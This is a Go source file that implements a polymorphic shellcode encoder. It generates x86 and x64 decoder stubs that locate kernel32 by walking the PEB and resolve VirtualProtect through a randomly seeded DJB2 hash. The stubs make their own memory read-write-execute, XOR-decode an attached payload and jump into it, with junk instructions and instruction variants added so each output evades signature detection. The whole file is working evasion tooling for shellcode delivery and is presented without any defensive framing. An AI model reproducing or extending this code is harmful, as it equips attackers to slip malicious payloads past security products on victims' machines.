package main

import (
	"crypto/rand"
	"encoding/binary"
	"math/big"
)

// djb2HashWithSeed computes the DJB2 hash of a string with a custom seed.
// Used to pre-compute the VirtualProtect hash for each stub.
func djb2HashWithSeed(s string, seed uint32) uint32 {
	h := seed
	for i := 0; i < len(s); i++ {
		h = h*33 + uint32(s[i])
	}
	return h
}

// cryptoRandIntn returns a random int in [0, n).
func cryptoRandIntn(n int) int {
	if n <= 0 {
		return 0
	}
	val, _ := rand.Int(rand.Reader, big.NewInt(int64(n)))
	return int(val.Int64())
}

// emitJunkX64 produces minLen..maxLen bytes of junk instructions (x64-safe).
// Each instruction is emitted atomically — no truncation mid-instruction.
func emitJunkX64(minLen, maxLen int) []byte {
	if maxLen < 1 {
		return nil
	}
	if minLen < 0 {
		minLen = 0
	}
	// Target between minLen and maxLen
	target := minLen
	if maxLen > minLen {
		target = minLen + cryptoRandIntn(maxLen-minLen+1)
	}

	// x64-safe junk instructions (complete, never truncated)
	type junkInstr struct {
		bytes []byte
	}
	pool := []junkInstr{
		{[]byte{0x90}},                   // nop (1B)
		{[]byte{0x66, 0x90}},             // 2-byte nop
		{[]byte{0x0F, 0x1F, 0x00}},       // 3-byte nop
		{[]byte{0x0F, 0x1F, 0x40, 0x00}}, // 4-byte nop
		{[]byte{0x53, 0x5B}},             // push rbx; pop rbx (2B)
		{[]byte{0x51, 0x59}},             // push rcx; pop rcx (2B)
		{[]byte{0x52, 0x5A}},             // push rdx; pop rdx (2B)
		{[]byte{0x50, 0x58}},             // push rax; pop rax (2B)
	}

	var junk []byte
	for len(junk) < target {
		remaining := target - len(junk)
		// Pick a random instruction that fits
		var candidates []int
		for i, instr := range pool {
			if len(instr.bytes) <= remaining {
				candidates = append(candidates, i)
			}
		}
		if len(candidates) == 0 {
			break // Can't fit any more instructions
		}
		chosen := pool[candidates[cryptoRandIntn(len(candidates))]]
		junk = append(junk, chosen.bytes...)
	}
	return junk
}

// emitJunkX86 produces minLen..maxLen bytes of junk instructions (x86-safe).
func emitJunkX86(minLen, maxLen int) []byte {
	if maxLen < 1 {
		return nil
	}
	if minLen < 0 {
		minLen = 0
	}
	target := minLen
	if maxLen > minLen {
		target = minLen + cryptoRandIntn(maxLen-minLen+1)
	}

	type junkInstr struct {
		bytes []byte
	}
	pool := []junkInstr{
		{[]byte{0x90}},                   // nop (1B)
		{[]byte{0x0F, 0x1F, 0x00}},       // 3-byte nop
		{[]byte{0x0F, 0x1F, 0x40, 0x00}}, // 4-byte nop
		{[]byte{0x53, 0x5B}},             // push ebx; pop ebx (2B)
		{[]byte{0x51, 0x59}},             // push ecx; pop ecx (2B)
		{[]byte{0x52, 0x5A}},             // push edx; pop edx (2B)
		{[]byte{0x50, 0x58}},             // push eax; pop eax (2B)
		{[]byte{0x87, 0xDB}},             // xchg ebx, ebx (2B)
	}

	var junk []byte
	for len(junk) < target {
		remaining := target - len(junk)
		var candidates []int
		for i, instr := range pool {
			if len(instr.bytes) <= remaining {
				candidates = append(candidates, i)
			}
		}
		if len(candidates) == 0 {
			break
		}
		chosen := pool[candidates[cryptoRandIntn(len(candidates))]]
		junk = append(junk, chosen.bytes...)
	}
	return junk
}

// put32LE writes a uint32 as little-endian into dst at offset off.
func put32LE(dst []byte, off int, val uint32) {
	binary.LittleEndian.PutUint32(dst[off:off+4], val)
}

// patchDisp32 writes a signed 32-bit displacement at offset off in dst.
func patchDisp32(dst []byte, off int, disp int) {
	put32LE(dst, off, uint32(int32(disp)))
}

// generateStubX64 builds a polymorphic x64 XOR decoder stub.
// Returns (stub, keyOffset, sizeOffset).
func generateStubX64() ([]byte, int, int) {
	// Pick random DJB2 seed and pre-compute VirtualProtect hash
	seedVal := uint32(cryptoRandIntn(0xFFFFFFFE)) + 1 // 1..0xFFFFFFFF
	vpHash := djb2HashWithSeed("VirtualProtect", seedVal)

	var code []byte
	emit := func(b ...byte) { code = append(code, b...) }
	emitBytes := func(b []byte) { code = append(code, b...) }

	// ===== Block 1: Prologue =====
	// 6 pushes = 48 bytes on stack. With 16-aligned RSP at entry (injection),
	// RSP after 6 pushes = -48 = 0 mod 16. sub rsp,0x28 (40) → -88 = 8 mod 16.
	// call will push 8 more → 0 mod 16 inside callee. Correct for Win64 ABI.
	// push rbx; push rsi; push rdi; push rbp; push r12; push r13
	emit(0x53, 0x56, 0x57, 0x55, 0x41, 0x54, 0x41, 0x55)

	emitBytes(emitJunkX64(2, 6))

	// ===== Block 2: PEB walk → kernel32 base into r12 =====
	// mov rax, gs:[0x60]    — TEB → PEB
	emit(0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00)
	// mov rax, [rax+0x18]   — PEB.Ldr
	emit(0x48, 0x8B, 0x40, 0x18)
	// mov rax, [rax+0x20]   — InMemoryOrderModuleList
	emit(0x48, 0x8B, 0x40, 0x20)
	// mov rax, [rax]        — Flink (next entry)
	emit(0x48, 0x8B, 0x00)
	// mov rax, [rax]        — Flink again (kernel32)
	emit(0x48, 0x8B, 0x00)
	// mov r12, [rax+0x20]   — DLL base
	emit(0x4C, 0x8B, 0x60, 0x20)

	emitBytes(emitJunkX64(2, 4))

	// ===== Block 3: Parse export table, DJB2 hash → find VirtualProtect =====
	// movsxd rbx, dword [r12+0x3C]  — e_lfanew
	emit(0x49, 0x63, 0x5C, 0x24, 0x3C)
	// add rbx, r12
	emit(0x4C, 0x01, 0xE3)
	// mov eax, [rbx+0x88]  — ExportDir RVA
	emit(0x8B, 0x83, 0x88, 0x00, 0x00, 0x00)
	// add rax, r12
	emit(0x4C, 0x01, 0xE0)
	// mov ecx, [rax+0x18]  — NumberOfNames
	emit(0x8B, 0x48, 0x18)
	// mov ebx, [rax+0x20]  — AddressOfNames RVA
	emit(0x8B, 0x58, 0x20)
	// add rbx, r12
	emit(0x4C, 0x01, 0xE3)
	// push rax (save ExportDir base)
	emit(0x50)
	// xor edi, edi
	emit(0x31, 0xFF)

	// Hash loop start
	hashLoopStart := len(code)
	// mov esi, [rbx + rdi*4]
	emit(0x8B, 0x34, 0xBB)
	// add rsi, r12
	emit(0x4C, 0x01, 0xE6)

	// mov eax, <DJB2_SEED>  — polymorphic seed
	emit(0xB8)
	seedBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(seedBytes, seedVal)
	emitBytes(seedBytes)

	// DJB2 inner loop
	djb2Start := len(code)
	// movzx edx, byte [rsi]
	emit(0x0F, 0xB6, 0x16)
	// inc rsi
	emit(0x48, 0xFF, 0xC6)
	// test edx, edx
	emit(0x85, 0xD2)
	// jz hash_done (skip imul+add+jmp = 7 bytes)
	emit(0x74, 0x07)
	// imul eax, 0x21
	emit(0x6B, 0xC0, 0x21)
	// add eax, edx
	emit(0x01, 0xD0)
	// jmp djb2Start
	jmpBackDjb2 := len(code)
	emit(0xEB, 0x00) // placeholder
	code[jmpBackDjb2+1] = byte(djb2Start - (jmpBackDjb2 + 2))

	// hash_done:
	// cmp eax, <VP_HASH>
	emit(0x3D)
	vpHashBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(vpHashBytes, vpHash)
	emitBytes(vpHashBytes)

	// je found (placeholder)
	jeFoundOff := len(code)
	emit(0x74, 0x00) // patched below

	// inc edi
	emit(0xFF, 0xC7)
	// cmp edi, ecx
	emit(0x39, 0xCF)
	// jb hashLoopStart
	jbHashLoop := len(code)
	emit(0x72, 0x00) // placeholder
	code[jbHashLoop+1] = byte(hashLoopStart - (jbHashLoop + 2))

	// not found: pop rax; jmp near epilogue (E9 rel32 — safe for any distance)
	emit(0x58) // pop rax
	jmpNotFoundOff := len(code)
	emit(0xE9, 0x00, 0x00, 0x00, 0x00) // jmp near rel32 placeholder

	// found: patch je offset
	foundOff := len(code)
	code[jeFoundOff+1] = byte(foundOff - (jeFoundOff + 2))

	// pop rax (restore ExportDir pointer)
	emit(0x58)

	// Resolve function address from ordinals + addresses
	// mov edx, [rax+0x24]  — AddressOfOrdinals RVA
	emit(0x8B, 0x50, 0x24)
	// add rdx, r12
	emit(0x4C, 0x01, 0xE2)
	// movzx edi, word [rdx + rdi*2]
	emit(0x0F, 0xB7, 0x3C, 0x7A)
	// mov edx, [rax+0x1C]  — AddressOfFunctions RVA
	emit(0x8B, 0x50, 0x1C)
	// add rdx, r12
	emit(0x4C, 0x01, 0xE2)
	// mov eax, [rdx + rdi*4]
	emit(0x8B, 0x04, 0xBA)
	// add rax, r12
	emit(0x4C, 0x01, 0xE0)
	// mov r12, rax  — VirtualProtect address in r12
	emit(0x49, 0x89, 0xC4)

	emitBytes(emitJunkX64(2, 4))

	// ===== Block 4: Call VirtualProtect =====
	// sub rsp, 0x28 (shadow space 32 + 8 alignment)
	// With 8 pushes (64 bytes), RSP is 16-aligned. sub 0x28 (40) → 8 mod 16.
	// call pushes 8 → 0 mod 16 inside VirtualProtect. Correct.
	emit(0x48, 0x83, 0xEC, 0x28)

	// lea rcx, [rip - X]  — address of stub start (patched later)
	vpCallRcxOff := len(code)
	emit(0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00) // placeholder disp32

	// lea rdx, [rip + Y]  — address of size field (patched later)
	vpCallRdxOff := len(code)
	emit(0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00) // placeholder disp32

	// mov eax, [rip + Z]  — load payload size (patched later)
	vpCallSizeOff := len(code)
	emit(0x8B, 0x05, 0x00, 0x00, 0x00, 0x00) // placeholder disp32

	// lea rdx, [rdx + rax + 0x14]  — end address = &sizeField + payloadSize + 20 (key+size)
	emit(0x48, 0x8D, 0x54, 0x02, 0x14)
	// sub rdx, rcx  — dwSize = end - start
	emit(0x48, 0x29, 0xCA)

	// Pick one of two PAGE_EXECUTE_READWRITE encodings
	if cryptoRandIntn(2) == 0 {
		// mov r8d, 0x40
		emit(0x41, 0xB8, 0x40, 0x00, 0x00, 0x00)
	} else {
		// xor r8d, r8d; add r8d, 0x40
		emit(0x45, 0x31, 0xC0, 0x41, 0x83, 0xC0, 0x40)
	}

	// lea r9, [rsp+0x20]  — lpflOldProtect (in shadow space)
	emit(0x4C, 0x8D, 0x4C, 0x24, 0x20)
	// call r12 (VirtualProtect)
	emit(0x41, 0xFF, 0xD4)
	// add rsp, 0x28
	emit(0x48, 0x83, 0xC4, 0x28)

	emitBytes(emitJunkX64(2, 4))

	// ===== Block 5: XOR decode loop =====
	// lea rsi, [rip + key_offset]
	xorLeaKeyOff := len(code)
	emit(0x48, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00) // placeholder

	// lea rdi, [rip + data_offset]
	xorLeaDataOff := len(code)
	emit(0x48, 0x8D, 0x3D, 0x00, 0x00, 0x00, 0x00) // placeholder

	// mov ecx, [rip + size_offset]
	xorMovSizeOff := len(code)
	emit(0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00) // placeholder

	// XOR loop — pick one of 3 variants for zero-init
	switch cryptoRandIntn(3) {
	case 0:
		emit(0x31, 0xD2) // xor edx, edx
	case 1:
		emit(0x29, 0xD2) // sub edx, edx
	case 2:
		emit(0x33, 0xD2) // xor edx, edx (alternate encoding)
	}

	xorLoopStart := len(code)
	// mov al, [rsi + rdx]
	emit(0x8A, 0x04, 0x16)
	// xor [rdi], al
	emit(0x30, 0x07)

	// inc rdi — pick variant
	switch cryptoRandIntn(3) {
	case 0:
		emit(0x48, 0xFF, 0xC7) // inc rdi
	case 1:
		emit(0x48, 0x83, 0xC7, 0x01) // add rdi, 1
	case 2:
		emit(0x48, 0x8D, 0x7F, 0x01) // lea rdi, [rdi+1]
	}

	// inc edx
	emit(0xFF, 0xC2)
	// and edx, 0x0F
	emit(0x83, 0xE2, 0x0F)

	// dec ecx — pick variant
	switch cryptoRandIntn(2) {
	case 0:
		emit(0xFF, 0xC9) // dec ecx
	case 1:
		emit(0x83, 0xE9, 0x01) // sub ecx, 1
	}

	// jnz xorLoopStart
	jnzOff := len(code)
	emit(0x75, 0x00) // placeholder
	code[jnzOff+1] = byte(xorLoopStart - (jnzOff + 2))

	// ===== Block 6: Epilogue =====
	epilogueOff := len(code)
	// pop r13; pop r12; pop rbp; pop rdi; pop rsi; pop rbx (reverse order of prologue)
	emit(0x41, 0x5D, 0x41, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B)

	// jmp to payload (will jump over key+size area)
	jmpPayloadOff := len(code)
	emit(0xEB, 0x00) // placeholder — patched after we know key+size layout

	// Patch jmpNotFound (E9 rel32) to jump to epilogue
	patchDisp32(code, jmpNotFoundOff+1, epilogueOff-(jmpNotFoundOff+5))

	// ===== Data area: [key 16B] [size 4B] =====
	keyOffset := len(code)
	code = append(code, make([]byte, 16)...) // key placeholder
	sizeOffset := len(code)
	code = append(code, make([]byte, 4)...) // size placeholder

	// Patch jmp over data area
	dataEnd := len(code)
	code[jmpPayloadOff+1] = byte(dataEnd - (jmpPayloadOff + 2))

	// ===== Patch RIP-relative offsets =====
	// VirtualProtect call patches:
	// rcx = lea [rip + disp] pointing to start of stub (offset 0)
	patchDisp32(code, vpCallRcxOff+3, -(vpCallRcxOff+7))

	// rdx = lea [rip + disp] pointing to size field
	patchDisp32(code, vpCallRdxOff+3, sizeOffset-(vpCallRdxOff+7))

	// eax = mov [rip + disp] loading size value
	patchDisp32(code, vpCallSizeOff+2, sizeOffset-(vpCallSizeOff+6))

	// XOR loop lea key
	patchDisp32(code, xorLeaKeyOff+3, keyOffset-(xorLeaKeyOff+7))

	// XOR loop lea data (points to dataEnd = right after size field)
	patchDisp32(code, xorLeaDataOff+3, dataEnd-(xorLeaDataOff+7))

	// XOR loop mov size
	patchDisp32(code, xorMovSizeOff+2, sizeOffset-(xorMovSizeOff+6))

	return code, keyOffset, sizeOffset
}

// generateStubX86 builds a polymorphic x86 XOR decoder stub.
// Returns (stub, keyOffset, sizeOffset).
func generateStubX86() ([]byte, int, int) {
	seedVal := uint32(cryptoRandIntn(0xFFFFFFFE)) + 1
	vpHash := djb2HashWithSeed("VirtualProtect", seedVal)

	var code []byte
	emit := func(b ...byte) { code = append(code, b...) }
	emitBytes := func(b []byte) { code = append(code, b...) }

	// ===== Block 1: Prologue =====
	// pushad
	emit(0x60)
	// call $+5; pop ebp; sub ebp, 6  → get EIP into ebp (base of stub)
	emit(0xE8, 0x00, 0x00, 0x00, 0x00)
	emit(0x5D)
	emit(0x83, 0xED, 0x06)

	emitBytes(emitJunkX86(2, 4))

	// ===== Block 2: PEB walk → kernel32 base into ebx =====
	// mov eax, fs:[0x30]
	emit(0x64, 0xA1, 0x30, 0x00, 0x00, 0x00)
	// mov eax, [eax+0x0C]
	emit(0x8B, 0x40, 0x0C)
	// mov eax, [eax+0x14]
	emit(0x8B, 0x40, 0x14)
	// mov eax, [eax]
	emit(0x8B, 0x00)
	// mov eax, [eax]
	emit(0x8B, 0x00)
	// mov ebx, [eax+0x10]
	emit(0x8B, 0x58, 0x10)

	emitBytes(emitJunkX86(2, 4))

	// ===== Block 3: Export table + DJB2 hash → VirtualProtect =====
	// mov eax, [ebx+0x3C]
	emit(0x8B, 0x43, 0x3C)
	// add eax, ebx
	emit(0x01, 0xD8)
	// mov eax, [eax+0x78]
	emit(0x8B, 0x40, 0x78)
	// add eax, ebx
	emit(0x01, 0xD8)
	// mov ecx, [eax+0x18]
	emit(0x8B, 0x48, 0x18)
	// push eax
	emit(0x50)
	// mov edx, [eax+0x20]
	emit(0x8B, 0x50, 0x20)
	// add edx, ebx
	emit(0x01, 0xDA)
	// xor edi, edi
	emit(0x31, 0xFF)

	// Hash loop
	hashLoopStart := len(code)
	// mov esi, [edx+edi*4]
	emit(0x8B, 0x34, 0xBA)
	// add esi, ebx
	emit(0x01, 0xDE)
	// mov eax, <seed>
	emit(0xB8)
	seedBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(seedBytes, seedVal)
	emitBytes(seedBytes)

	// DJB2 inner loop
	djb2Start := len(code)
	// movzx ecx, byte [esi]
	emit(0x0F, 0xB6, 0x0E)
	// inc esi
	emit(0x46)
	// test ecx, ecx
	emit(0x85, 0xC9)
	// jz hash_done
	emit(0x74, 0x07)
	// imul eax, 0x21
	emit(0x6B, 0xC0, 0x21)
	// add eax, ecx
	emit(0x01, 0xC8)
	// jmp djb2Start
	jmpDjb2 := len(code)
	emit(0xEB, 0x00)
	code[jmpDjb2+1] = byte(djb2Start - (jmpDjb2 + 2))

	// hash_done: restore ecx and check
	// pop ecx; push ecx — restore ExportDir pointer for ecx
	emit(0x59, 0x51)
	// mov ecx, [ecx+0x18]  — NumberOfNames
	emit(0x8B, 0x49, 0x18)

	// cmp eax, <hash>
	emit(0x3D)
	vpHashBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(vpHashBytes, vpHash)
	emitBytes(vpHashBytes)

	// je found
	jeFoundOff := len(code)
	emit(0x74, 0x00)

	// inc edi
	emit(0x47)
	// cmp edi, ecx
	emit(0x39, 0xCF)
	// jb hashLoopStart
	jbHashLoop := len(code)
	emit(0x72, 0x00)
	code[jbHashLoop+1] = byte(hashLoopStart - (jbHashLoop + 2))

	// not found: pop eax; jmp near epilogue (E9 rel32)
	emit(0x58)
	jmpNotFoundOff := len(code)
	emit(0xE9, 0x00, 0x00, 0x00, 0x00) // jmp near rel32 placeholder

	// found:
	foundOff := len(code)
	code[jeFoundOff+1] = byte(foundOff - (jeFoundOff + 2))
	// pop eax (ExportDir)
	emit(0x58)

	// Resolve VirtualProtect address
	// mov edx, [eax+0x24]
	emit(0x8B, 0x50, 0x24)
	// add edx, ebx
	emit(0x01, 0xDA)
	// movzx edi, word [edx+edi*2]
	emit(0x0F, 0xB7, 0x3C, 0x7A)
	// mov edx, [eax+0x1C]
	emit(0x8B, 0x50, 0x1C)
	// add edx, ebx
	emit(0x01, 0xDA)
	// mov eax, [edx+edi*4]
	emit(0x8B, 0x04, 0xBA)
	// add eax, ebx — VirtualProtect in eax
	emit(0x01, 0xD8)

	emitBytes(emitJunkX86(2, 4))

	// ===== Block 4: Call VirtualProtect =====
	// sub esp, 4 (old protect)
	emit(0x83, 0xEC, 0x04)
	// mov edi, esp
	emit(0x89, 0xE7)
	// push edi (lpflOldProtect)
	emit(0x57)

	// push PAGE_EXECUTE_READWRITE
	emit(0x6A, 0x40) // push 0x40

	// lea ecx, [ebp + keyOffset]  — patched later
	vpLeaKeyOff := len(code)
	emit(0x8D, 0x8D, 0x00, 0x00, 0x00, 0x00) // placeholder dword

	// mov edx, [ebp + sizeOffset]  — patched later
	vpMovSizeOff := len(code)
	emit(0x8B, 0x95, 0x00, 0x00, 0x00, 0x00) // placeholder dword

	// lea edx, [edx + ecx + 0x14]
	emit(0x8D, 0x54, 0x11, 0x14)
	// sub edx, ebp — size
	emit(0x29, 0xEA)
	// push edx (dwSize)
	emit(0x52)
	// push ebp (lpAddress)
	emit(0x55)
	// call eax (VirtualProtect)
	emit(0xFF, 0xD0)
	// add esp, 4
	emit(0x83, 0xC4, 0x04)

	emitBytes(emitJunkX86(2, 4))

	// ===== Block 5: XOR decode loop =====
	// lea esi, [ebp + keyOffset]
	xorLeaKeyOff := len(code)
	emit(0x8D, 0xB5, 0x00, 0x00, 0x00, 0x00) // placeholder

	// lea edi, [ebp + dataOffset]
	xorLeaDataOff := len(code)
	emit(0x8D, 0xBD, 0x00, 0x00, 0x00, 0x00) // placeholder

	// mov ecx, [ebp + sizeOffset]
	xorMovSizeOff := len(code)
	emit(0x8B, 0x8D, 0x00, 0x00, 0x00, 0x00) // placeholder

	// Zero init
	switch cryptoRandIntn(3) {
	case 0:
		emit(0x31, 0xD2) // xor edx, edx
	case 1:
		emit(0x29, 0xD2) // sub edx, edx
	case 2:
		emit(0x33, 0xD2) // xor edx, edx alt
	}

	xorLoopStart := len(code)
	// mov al, [esi+edx]
	emit(0x8A, 0x04, 0x16)
	// xor [edi], al
	emit(0x30, 0x07)
	// inc edi
	emit(0x47)
	// inc edx
	emit(0x42)
	// and edx, 0x0F
	emit(0x83, 0xE2, 0x0F)
	// dec ecx
	switch cryptoRandIntn(2) {
	case 0:
		emit(0x49) // dec ecx
	case 1:
		emit(0x83, 0xE9, 0x01) // sub ecx, 1
	}
	// jnz loop
	jnzOff := len(code)
	emit(0x75, 0x00)
	code[jnzOff+1] = byte(xorLoopStart - (jnzOff + 2))

	// ===== Block 6: Epilogue =====
	epilogueOff := len(code)
	// popad
	emit(0x61)
	// call $+5; pop eax; add eax, <offset>; jmp eax
	emit(0xE8, 0x00, 0x00, 0x00, 0x00)
	emit(0x58)

	// Patch jmpNotFound (E9 rel32) to jump to epilogue
	patchDisp32(code, jmpNotFoundOff+1, epilogueOff-(jmpNotFoundOff+5))

	// add eax, <offset> — patched after data area
	addEaxOff := len(code)
	emit(0x83, 0xC0, 0x00) // placeholder: add eax, imm8

	// jmp eax
	emit(0xFF, 0xE0)

	// ===== Data area =====
	keyOffset := len(code)
	code = append(code, make([]byte, 16)...)
	sizeOffset := len(code)
	code = append(code, make([]byte, 4)...)
	dataEnd := len(code)

	// Patch add eax: call pushes return address = address of pop eax.
	// pop eax → eax = address of addEaxOff - 1 (the pop itself)
	// Actually: call at (epilogueOff+1) pushes return address of next instr = (epilogueOff+6).
	// pop eax → eax = (epilogueOff + 6). But in runtime, that's a memory address.
	// We want eax to point to dataEnd in memory.
	// addEaxOff is where "add eax, imm8" starts. Pop eax is at addEaxOff-1.
	// call pushes the address of addEaxOff-1 (the instruction after call).
	// Wait — call pushes return address = address of next instruction = addEaxOff - 1.
	// Actually, pop eax is at the address right after call $+5. call is at epilogueOff+1.
	// call pushes eip = epilogueOff + 1 + 5 = epilogueOff + 6. pop eax gets that address.
	// In terms of offsets from stub start: eax = epilogueOff + 6.
	// But pop is AT offset epilogueOff + 6 - wait:
	// epilogue: 61(popad) E8 00 00 00 00(call) 58(pop eax)
	// call is at epilogueOff+1, it pushes return address = epilogueOff+6
	// pop eax is at epilogueOff+6, eax = epilogueOff+6 (the runtime address of pop itself)
	// add eax, X → eax = (runtime addr of pop) + X
	// We want eax = runtime addr of dataEnd = runtime addr of (pop) + (dataEnd - (epilogueOff+6))
	addVal := dataEnd - (epilogueOff + 6)
	code[addEaxOff+2] = byte(addVal)

	// Patch ebp-relative offsets
	put32LE(code, vpLeaKeyOff+2, uint32(keyOffset))
	put32LE(code, vpMovSizeOff+2, uint32(sizeOffset))
	put32LE(code, xorLeaKeyOff+2, uint32(keyOffset))
	put32LE(code, xorLeaDataOff+2, uint32(dataEnd))
	put32LE(code, xorMovSizeOff+2, uint32(sizeOffset))

	return code, keyOffset, sizeOffset
}

// xorEncodeShellcode applies XOR encoding to a shellcode payload.
// Returns the encoded payload prepended with a polymorphic self-decoding stub that:
//  1. Resolves VirtualProtect via PEB walk (kernel32) using random DJB2 seed
//  2. Makes its own memory RWX
//  3. XOR-decodes the payload in-place
//  4. Jumps to the decoded payload
//
// Each call generates a unique stub with different:
//   - DJB2 hash seed and target hash
//   - Junk instruction padding (variable size)
//   - Instruction equivalences in the decode loop
func xorEncodeShellcode(payload []byte, arch string) ([]byte, error) {
	// Generate 16-byte random XOR key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}

	// XOR-encode the payload
	encoded := make([]byte, len(payload))
	for i, b := range payload {
		encoded[i] = b ^ key[i%16]
	}

	// Generate polymorphic stub
	var stub []byte
	var keyOffset, sizeOffset int
	if arch == "x86" {
		stub, keyOffset, sizeOffset = generateStubX86()
	} else {
		stub, keyOffset, sizeOffset = generateStubX64()
	}

	// Patch key into stub
	copy(stub[keyOffset:keyOffset+16], key)

	// Patch payload size into stub (little-endian uint32)
	binary.LittleEndian.PutUint32(stub[sizeOffset:sizeOffset+4], uint32(len(payload)))

	// Assemble: stub + encoded payload
	result := make([]byte, 0, len(stub)+len(encoded))
	result = append(result, stub...)
	result = append(result, encoded...)
	return result, nil
}
